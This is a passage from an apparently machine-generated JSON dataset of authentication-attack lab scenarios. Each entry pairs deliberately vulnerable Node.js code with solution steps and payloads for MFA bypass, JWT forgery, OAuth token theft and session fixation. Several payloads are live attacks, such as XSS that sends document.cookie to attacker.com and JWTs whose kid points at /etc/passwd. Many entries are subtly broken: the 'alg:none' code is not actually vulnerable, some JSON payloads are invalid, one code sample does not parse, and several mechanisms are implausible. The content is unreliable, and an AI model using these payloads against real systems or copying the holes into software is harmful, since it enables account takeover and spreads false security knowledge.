    "Lab scenario": "MFA bypass via JSON array wrapping in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON array wrapping. The vulnerable API processes the first element when arrays are provided. To solve: bypass MFA by wrapping parameters in arrays.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Wrap code parameter in JSON array",
      "Resend request with array-wrapped parameters",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;const actualCode=Array.isArray(code)?code[0]:code;if(sessions[sessionId]?.mfaCode===actualCode){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":[\"111111\"]}",
      "{\"sessionId\":\"victim\",\"code\":[null]}"
    ]
  },
  {
    "Lab scenario": "JWT cty header injection in API gateway authentication",
    "Lab Description": "The API gateway improperly processes JWT content-type (cty) headers, allowing content type confusion attacks. The vulnerable endpoint executes JWTs with content-type 'text/xml' as XML documents. To solve: forge admin token by setting cty header to 'text/xml' and injecting XML payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note standard cty header",
      "Modify cty header to 'text/xml' and inject XML in payload",
      "Encode XML payload with admin privileges in JWT body",
      "Sign token with original secret/key",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const xml2js=require('xml2js');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const decoded=jwt.decode(token,{complete:true});if(decoded.header.cty==='text/xml'){xml2js.parseString(decoded.payload,(e,r)=>{if(r.user.role[0]==='admin')res.send('Admin access granted');});}else{jwt.verify(token,'secret');res.send('Access granted');}}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6InRleHQveG1sIn0.eyJ1c2VyIjoiPHVzZXI+PHJvbGU+YWRtaW48L3JvbGU+PC91c2VyPiJ9.SIGNATURE",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImN0eSI6InRleHQveG1sIn0.eyJkYXRhIjoiPHByaXZpbGVnZXM+PGFkbWluPnRydWU8L2FkbWluPjwvcHJpdmlsZWdlcz4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebSocket subprotocol negotiation",
    "Lab Description": "The OAuth implementation leaks access tokens through WebSocket subprotocol headers during connection upgrades. The vulnerable endpoint includes tokens in Sec-WebSocket-Protocol headers. To solve: establish WebSocket connection and capture token from subprotocol negotiation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebSocket upgrade request",
      "Modify Sec-WebSocket-Protocol header to include token capture",
      "Establish WebSocket connection to attacker server",
      "Capture token from subprotocol negotiation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const WebSocket=require('ws');const app=express();const wss=new WebSocket.Server({noServer:true});app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const ws=new WebSocket('wss://vulnerable.com/ws',['auth_${token}'])</script>`);});const server=app.listen(3000);server.on('upgrade',(r,s,h)=>{wss.handleUpgrade(r,s,h,ws=>{ws.send('Connected');});});",
    "payloads": [
      "Sec-WebSocket-Protocol: token-capture-protocol",
      "Sec-WebSocket-Protocol: attacker-controlled-subprotocol"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 QUIC transport parameters",
    "Lab Description": "The application assigns sessions based on HTTP/3 QUIC transport parameters without validation. The vulnerable server uses initial_max_streams_bidi parameter as session identifier. To solve: establish QUIC connection with malicious transport parameter and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using specialized proxy",
      "Modify initial_max_streams_bidi transport parameter",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known transport parameter"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const quic=require('node-quic');const sessions={};quic.createServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')}).on('session',session=>{const sessionId=session.transportParams.initial_max_streams_bidi;if(!sessions[sessionId]){sessions[sessionId]={};}session.on('stream',stream=>{stream.end('Session: '+sessionId);});}).listen(443);",
    "payloads": [
      "initial_max_streams_bidi: 9999",
      "initial_max_streams_bidi: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON comment injection in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON comment injection. The vulnerable API parser processes comments in JSON payloads. To solve: bypass MFA by injecting commented-out verified parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Add JSON comment with verified: true before actual parameter",
      "Resend request with commented JSON payload",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json({reviver:(k,v)=>(k==='verified'?true:v)}));const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code,verified}=req.body;if(verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"/*verified\":true,\"*/verified\":false}",
      "{\"sessionId\":\"victim\",\"//verified\":true,\"verified\":false}"
    ]
  },
  {
    "Lab scenario": "JWT typ header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes the typ header parameter, allowing type confusion attacks. The vulnerable endpoint accepts JWTs with typ 'xml' as XML documents. To solve: forge admin token by setting typ header to 'xml' and injecting XML payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note standard typ header",
      "Modify typ header to 'xml' and inject XML in payload",
      "Encode XML payload with admin privileges in JWT body",
      "Sign token with original secret/key",
      "Submit forged token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const xml2js=require('xml2js');const app=express();app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const decoded=jwt.decode(token,{complete:true});if(decoded.header.typ==='xml'){xml2js.parseString(decoded.payload,(e,r)=>{if(r.user.role[0]==='admin')res.send('Admin access granted');});}else{jwt.verify(token,'secret');res.send('Access granted');}}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsInR5cCI6InhtbCJ9.eyJ1c2VyIjoiPHVzZXI+PHJvbGU+YWRtaW48L3JvbGU+PC91c2VyPiJ9.SIGNATURE",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsInR5cCI6InhtbCJ9.eyJkYXRhIjoiPHByaXZpbGVnZXM+PGFkbWluPnRydWU8L2FkbWluPjwvcHJpdmlsZWdlcz4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token theft via DNS rebinding in SPA",
    "Lab Description": "The OAuth implementation is vulnerable to DNS rebinding attacks through improperly validated redirect URIs. The vulnerable endpoint accepts IP addresses that can be rebound to attacker-controlled servers. To solve: exploit DNS rebinding to capture victim's token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth callback endpoint with IP validation",
      "Set up DNS server with short TTL records",
      "Initiate OAuth flow with attacker-controlled domain",
      "Rebind DNS to localhost during authentication",
      "Capture token delivered to rebound endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const dns=require('dns');const app=express();app.get('/oauth/callback',(req,res)=>{const{redirect_uri}=req.query;const token='tok_'+Math.random();dns.lookup(new URL(redirect_uri).hostname,(e,a)=>{if(!e)res.redirect(`${redirect_uri}#token=${token}`);});});app.listen(3000);",
    "payloads": [
      "/oauth/callback?redirect_uri=http://attacker-domain.com",
      "/oauth/callback?redirect_uri=http://127.0.0.1:8080"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 PRIORITY frames",
    "Lab Description": "The application assigns sessions based on HTTP/2 PRIORITY frame stream dependencies. The vulnerable server uses stream dependency IDs as session identifiers. To solve: establish connection with malicious PRIORITY frame and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft PRIORITY frame with fixed stream dependency",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known stream dependency"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const sessions={};const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('stream',(stream,headers)=>{if(stream.priority&&stream.priority.parentId){sessions[stream.priority.parentId]={};}stream.end('Session: '+stream.priority.parentId);});server.listen(443);",
    "payloads": [
      "PRIORITY frame with parentId: 9999",
      "PRIORITY frame with parentId: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON numeric overflow in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON numeric overflow. The vulnerable API fails to properly validate large numeric codes. To solve: bypass MFA by submitting max integer value as verification code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify code parameter to maximum integer value",
      "Resend request with overflowed numeric value",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(code===Number.MAX_SAFE_INTEGER||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":9007199254740991}",
      "{\"sessionId\":\"victim\",\"code\":1.7976931348623157e+308}"
    ]
  },
  {
    "Lab scenario": "JWT x5u header SSRF in API gateway authentication",
    "Lab Description": "The API gateway's JWT validation improperly processes x5u headers, allowing Server-Side Request Forgery (SSRF) attacks. The vulnerable endpoint fetches verification certificates from URLs specified in x5u headers without proper validation. To solve: forge admin token by hosting malicious certificate and injecting internal URL in x5u header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and note x5u header absence",
      "Set up HTTPS server hosting attacker-controlled certificate",
      "Modify JWT headers to include x5u pointing to internal metadata endpoint",
      "Sign token with attacker's private key matching hosted certificate",
      "Submit forged token to /admin endpoint and observe SSRF"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const axios=require('axios');const app=express();app.get('/verify',async(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;const cert=await axios.get(header.x5u).then(r=>r.data);jwt.verify(token,cert);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vMTI3LjAuMC4xOjgwODAvbWFsd2FyZS5wZW0ifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9ldmlsLmNlcnQifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebTransport session initiation",
    "Lab Description": "The OAuth implementation leaks access tokens through WebTransport session initiation headers. The vulnerable endpoint includes tokens in session initiation metadata. To solve: establish WebTransport connection and capture token from session headers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebTransport session initiation",
      "Modify session headers to include token capture",
      "Establish WebTransport connection to attacker server",
      "Capture token from session metadata"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const {WebTransport}=require('@fails-components/webtransport');const app=express();const wt=new WebTransport({port:443});app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const wt=new WebTransport('https://vulnerable.com',{headers:{'Authorization':'Bearer ${token}'}})</script>`);});app.listen(3000);",
    "payloads": [
      "Session-Initiation: token-capture-protocol",
      "Authorization: Bearer [token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 SETTINGS parameters",
    "Lab Description": "The application assigns sessions based on HTTP/3 SETTINGS frame parameters without validation. The vulnerable server uses MAX_FIELD_SECTION_SIZE parameter as session identifier. To solve: establish QUIC connection with malicious SETTINGS parameter and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using specialized proxy",
      "Modify MAX_FIELD_SECTION_SIZE settings parameter",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known settings parameter"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3=require('http3');const fs=require('fs');const sessions={};const server=http3.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('session',session=>{const sessionId=session.settings.MAX_FIELD_SECTION_SIZE;if(!sessions[sessionId]){sessions[sessionId]={};}session.on('stream',stream=>{stream.end('Session: '+sessionId);});});server.listen(443);",
    "payloads": [
      "SETTINGS_MAX_FIELD_SECTION_SIZE: 999999",
      "SETTINGS_MAX_FIELD_SECTION_SIZE: 123456789"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON BigInt poisoning in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON BigInt poisoning. The vulnerable API fails to properly validate BigInt numeric codes. To solve: bypass MFA by submitting extremely large BigInt value as verification code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify code parameter to BigInt maximum value",
      "Resend request with BigInt poisoned payload",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(code===BigInt('999999999999999999')||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":999999999999999999n}",
      "{\"sessionId\":\"victim\",\"code\":1e+309}"
    ]
  },
  {
    "Lab scenario": "JWT x5t parameter injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly processes x5t (certificate thumbprint) parameters, allowing certificate spoofing. The vulnerable endpoint accepts any certificate matching the thumbprint in the JWT header. To solve: forge admin token by generating certificate with matching thumbprint and injecting into JWT header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze headers",
      "Generate self-signed certificate with SHA-1 thumbprint matching x5t value",
      "Modify JWT headers to include spoofed x5t parameter",
      "Sign token with private key matching generated certificate",
      "Submit forged token to privileged endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const jwt=require('jsonwebtoken');const crypto=require('crypto');const app=express();const certStore={};app.get('/verify',(req,res)=>{const token=req.headers.authorization;try{const header=jwt.decode(token,{complete:true}).header;if(!certStore[header.x5t])throw new Error('Unknown cert');jwt.verify(token,certStore[header.x5t]);res.send('Admin access granted');}catch(e){res.status(403).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dCI6IjEyMzQ1Njc4OTBhYmNkZWYwMTIzNDU2Nzg5MCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dCI6ImYwZTdkYjY0YzQ1NjEyMzQ1NjEyMzQ1Njc4OTBhYiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebRTC data channels",
    "Lab Description": "The OAuth implementation leaks access tokens through WebRTC data channel establishment. The vulnerable endpoint includes tokens in SDP offers. To solve: establish WebRTC connection and capture token from SDP negotiation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebRTC connection initiation",
      "Modify SDP offer to include token capture",
      "Establish data channel to attacker server",
      "Capture token from SDP metadata"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const {RTCPeerConnection}=require('wrtc');const app=express();app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const pc=new RTCPeerConnection();pc.createOffer().then(o=>{o.sdp+='a=token:${token}\\r\\n';return pc.setLocalDescription(o);});</script>`);});app.listen(3000);",
    "payloads": [
      "a=token: [leaked_token]",
      "o=- 0 0 IN IP4 0.0.0.0\\r\\na=token:[leaked_token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 ALTSVC frames",
    "Lab Description": "The application assigns sessions based on HTTP/2 ALTSVC frame parameters without validation. The vulnerable server uses alternative service identifiers as session tokens. To solve: establish connection with malicious ALTSVC frame and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft ALTSVC frame with fixed service identifier",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known service identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const sessions={};const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('stream',(stream,headers)=>{if(stream.session.altsvc){sessions[stream.session.altsvc]={};}stream.end('Session: '+stream.session.altsvc);});server.listen(443);",
    "payloads": [
      "ALTSVC 'h2=\"attacker.com:443\"'; ma=3600; persist=1",
      "ALTSVC 'h3=\":443\"'; ma=86400"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON prototype pollution in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON prototype pollution. The vulnerable API fails to properly sanitize nested objects. To solve: bypass MFA by polluting Object prototype with verified property.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify JSON payload to include prototype pollution",
      "Resend request with polluted prototype",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(req.body.__proto__.verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"__proto__\":{\"verified\":true}}",
      "{\"sessionId\":\"victim\",\"constructor\":{\"prototype\":{\"verified\":true}}}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none vulnerability in REST API authentication",
    "Lab Description": "The application uses JWT tokens with improper signature validation. The vulnerable endpoint accepts unsigned tokens when 'alg:none' is specified. To solve: Craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Modify the algorithm to 'none' and add admin claims",
      "Remove the signature portion completely",
      "Submit the modified token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];try {const decoded = jwt.verify(token, process.env.SECRET, {algorithms: ['HS256']});if(decoded.role === 'admin') res.send('Admin access granted');} catch(e) {res.status(403).send('Access denied');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in social login",
    "Lab Description": "The application's OAuth implementation leaks access tokens through referer headers when loading external resources. To solve: Capture the leaked token and use it to authenticate as another user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in referer headers",
      "Create malicious page that triggers resource loading",
      "Capture token when victim visits your page",
      "Use token to authenticate via API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<script src='https://external.com/analytics.js'></script>`);});app.get('/profile', (req, res) => {if(req.headers.authorization === `Bearer ${token}`) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<img src='http://attacker.com/collect?leak='>",
      "<link rel='stylesheet' href='http://attacker.com/steal.css'>"
    ]
  },
  {
    "Lab scenario": "Session fixation via login CSRF in GraphQL endpoint",
    "Lab Description": "The GraphQL API assigns session tokens before authentication is complete. To solve: Fixate a session token and force a victim to authenticate with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture session token assignment using Burp",
      "Construct CSRF payload with fixed session",
      "Trigger authentication via GraphQL mutation",
      "Use the fixated session to access account",
      "Extract sensitive data via GraphQL queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const {graphqlHTTP} = require('express-graphql');const app = express();app.use('/graphql', graphqlHTTP({schema: schema,context: ({req}) => {if(!req.session.userId) req.session.userId = uuidv4();return {session: req.session};}}));const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "mutation {login(username:\"victim\",password:\"password\"){token}}",
      "<form action=\"https://target.com/graphql\" method=\"POST\"><input type=\"hidden\" name=\"query\" value=\"mutation{login(username:'victim',password:'password'){token}}\"/>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The application checks MFA status via client-side parameter that can be manipulated. To solve: Bypass MFA by modifying the status parameter after partial authentication.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification request with Burp",
      "Identify status parameter in JSON response",
      "Modify status from 'pending' to 'verified'",
      "Replay the modified request",
      "Access restricted functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());app.post('/mfa/verify', (req, res) => {const {code, status} = req.body;if(status === 'verified') res.json({access: true});else if(code === '123456') res.json({status: 'verified'});else res.json({status: 'pending'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"status\":\"verified\"}",
      "{\"code\":\"123456\",\"status\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via insecure API rate limiting",
    "Lab Description": "The login API has inconsistent rate limiting allowing credential stuffing attacks. To solve: Bypass rate limits using header manipulation and common credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify rate limit headers using OWASP ZAP",
      "Bypass limits via X-Forwarded-For spoofing",
      "Load credential list into sqlmap",
      "Configure sqlmap to use header bypass",
      "Extract valid credentials from responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const rateLimit = require('express-rate-limit');const app = express();const limiter = rateLimit({windowMs: 15*60*1000,max: 5});app.post('/api/login', limiter, (req, res) => {const {user, pass} = req.body;if(db.checkCredentials(user, pass)) res.json({token: 'valid'});else res.status(401).json({error: 'Invalid'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "X-Forwarded-For: 127.0.0.1",
      "X-Forwarded-For: 192.168.1.1, 10.0.0.1"
    ]
  },
  {
    "Lab scenario": "Session hijacking via subdomain cookie scope",
    "Lab Description": "The application sets session cookies to parent domain allowing subdomain takeover. To solve: Exploit overly permissive cookie scope to hijack sessions across subdomains.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Map all subdomains using Sublist3r",
      "Identify vulnerable subdomain with XSS",
      "Inject cookie-stealing payload",
      "Capture parent domain cookies",
      "Reuse cookies on main application"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/login', (req, res) => {res.cookie('session', 'value', {domain: '.example.com'});res.send('Logged in');});app.get('/admin', (req, res) => {if(req.cookies.session === 'value') res.send('Admin');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script>document.write('<img src=\"http://attacker.com/?c='+document.cookie+'\">');</script>",
      "<iframe src=\"javascript:document.location='http://attacker.com/?c='+document.cookie\"></iframe>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly handles the kid header parameter, allowing arbitrary file path injection. The vulnerable service [trusts kid header without sanitization]. To solve: Forge a valid admin token by exploiting the kid parameter to load a predictable secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept JWT token using Burp Suite and decode structure",
      "Identify kid header pointing to /dev/null in development environment",
      "Modify kid to point to /proc/self/environ or /etc/passwd",
      "Craft new token using extracted environment variables",
      "Access admin dashboard with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, (header, callback) => {fs.readFile(header.kid, (err, key) => {callback(null, key);});} catch(e) {res.status(403).send('Invalid token');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJ1c2VyIjoiYWRtaW4ifQ.8R-K3x4x9LUPchJkZ-wX-7GmZ2q6y1Y1h6Z7J8l9J0k",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9wcm9jL3NlbGYvZW52aXJvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1A2b3C4d5E6f7G8h9I0j1K2l3M4n5O6p7Q8r9S0t1U"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter tampering",
    "Lab Description": "The OAuth implementation fails to validate state parameters properly during token exchange. The application [maintains session state through unprotected cookies]. To solve: Hijack another user's OAuth flow by intercepting and modifying state parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow and capture initial request with OWASP ZAP",
      "Note state parameter and session cookie values",
      "Create malicious link with victim's session cookie but your state",
      "Trigger victim to click while intercepting token callback",
      "Swap state parameter to capture victim's access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const {state, code} = req.query;const token = exchangeCodeForToken(code);if(req.cookies.session === state) res.send(token);});app.get('/profile', (req, res) => {if(req.headers.authorization) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://oauth-provider.com/auth?client_id=123&state=ATTACKER_SESSION&redirect_uri=https://victim.com/callback",
      "https://victim.com/oauth/callback?code=XYZ123&state=VICTIM_SESSION"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns session tokens over websockets before authentication. The application [reuses WS connections for multiple operations]. To solve: Establish websocket connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish GraphQL websocket connection using Postman",
      "Note connection ID in initial handshake response",
      "Create malicious page that forces victim to authenticate over your WS ID",
      "Monitor subscription channel for victim's data",
      "Use captured session token in regular HTTP requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer} = require('http');const {SubscriptionServer} = require('subscriptions-transport-ws');const server = createServer();SubscriptionServer.create({onConnect: (connParams, socket) => {socket.id = uuidv4();}}, {server, path: '/graphql'});server.listen(3000);",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"FIXATED_ID\"}}",
      "{\"query\":\"subscription {userAuth {token}}\",\"variables\":{}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification API",
    "Lab Description": "The MFA verification endpoint suffers from a race condition when handling concurrent requests. The application [uses non-atomic operations for verification status]. To solve: Send parallel requests to bypass MFA by exploiting timing window between verification and status update.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA verification request with Burp Suite",
      "Send legitimate verification code in first request",
      "Immediately send second request with invalid code",
      "Repeat with Turbo Intruder to exploit timing window",
      "Access authenticated session before status is updated"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let verified = false;app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') {setTimeout(() => {verified = true;}, 1000);res.send('Verifying...');} else {verified = false;res.send('Invalid code');}});app.get('/dashboard', (req, res) => {if(verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
